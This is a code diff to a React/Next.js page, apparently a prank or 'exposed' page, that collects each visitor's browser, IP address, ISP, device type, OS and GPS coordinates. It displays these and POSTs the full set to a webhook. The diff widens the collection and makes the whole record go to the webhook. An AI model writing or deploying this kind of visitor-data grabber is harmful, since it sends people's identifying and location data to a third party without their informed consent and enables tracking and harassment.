@@ -2,25 +2,29 @@
 
 import { useState, useEffect } from "react"
 import { motion, AnimatePresence } from "framer-motion"
-import { useRouter } from "next/navigation"
 import Head from "next/head"
-import { Monitor, Globe, MapPin, ChevronRight, AlertTriangle } from "lucide-react"
+import { Monitor, Globe, MapPin, ChevronRight, AlertTriangle, Cpu, Wifi } from "lucide-react"
 
 interface DevInfo {
   browser: string;
   ip: string;
   coordinates?: { latitude: number; longitude: number };
+  isp: string;
+  device: string;
+  os: string;
 }
 
 export default function EnhancedDevExposed() {
   const [devInfo, setDevInfo] = useState<DevInfo>({
     browser: "",
     ip: "Fetching IP...",
+    isp: "ISP information unavailable",
+    device: "Detecting device...",
+    os: "Detecting OS...",
   })
   const [exposed, setExposed] = useState<boolean>(false)
   const [exposeMessage, setExposeMessage] = useState<string>("")
   const [command, setCommand] = useState<string>("")
-  const router = useRouter()
 
   useEffect(() => {
     const updateDevInfo = async () => {
@@ -31,6 +35,8 @@ export default function EnhancedDevExposed() {
       setDevInfo((prev) => ({
         ...prev,
         browser: browser || "Unknown",
+        device: /mobile/i.test(ua) ? 'Mobile' : 'Desktop',
+        os: navigator.platform,
       }))
 
       try {
@@ -39,20 +45,28 @@ export default function EnhancedDevExposed() {
         setDevInfo((prev) => ({
           ...prev,
           ip: data.ip || "Unable to fetch IP",
+          isp: data.isp || "ISP information unavailable",
         }))
       } catch (error) {
         console.error("Error fetching IP address:", error)
       }
 
-      navigator.geolocation.getCurrentPosition((position) => {
-        setDevInfo((prev) => ({
-          ...prev,
-          coordinates: {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            setDevInfo((prev) => ({
+              ...prev,
+              coordinates: {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+              },
+            }))
           },
-        }))
-      })
+          (error) => {
+            console.error("Error getting geolocation:", error)
+          }
+        )
+      }
     }
 
     updateDevInfo()
@@ -81,11 +95,7 @@ export default function EnhancedDevExposed() {
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({
-          browser: devInfo.browser,
-          ip: devInfo.ip,
-          coordinates: devInfo.coordinates,
-        }),
+        body: JSON.stringify(devInfo),
       })
     } catch (error) {
       console.error("Error sending data to webhook:", error)
@@ -181,6 +191,18 @@ export default function EnhancedDevExposed() {
                     <motion.div variants={infoVariants} className="flex items-center bg-[#D1B894] p-3 rounded-lg">
                       <Globe className="mr-2 text-[#34495E]" />
                       <span className="font-semibold">Your IP:</span> {devInfo.ip}
+                    </motion.div>
+                    <motion.div variants={infoVariants} className="flex items-center bg-[#D1B894] p-3 rounded-lg">
+                      <Wifi className="mr-2 text-[#34495E]" />
+                      <span className="font-semibold">ISP:</span> {devInfo.isp}
+                    </motion.div>
+                    <motion.div variants={infoVariants} className="flex items-center bg-[#D1B894] p-3 rounded-lg">
+                      <Cpu className="mr-2 text-[#34495E]" />
+                      <span className="font-semibold">Device:</span> {devInfo.device}
+                    </motion.div>
+                    <motion.div variants={infoVariants} className="flex items-center bg-[#D1B894] p-3 rounded-lg">
+                      <Monitor className="mr-2 text-[#34495E]" />
+                      <span className="font-semibold">OS:</span> {devInfo.os}
                     </motion.div>
                     {devInfo.coordinates && (
                       <motion.div variants={infoVariants} className="flex items-center bg-[#D1B894] p-3 rounded-lg col-span-full">
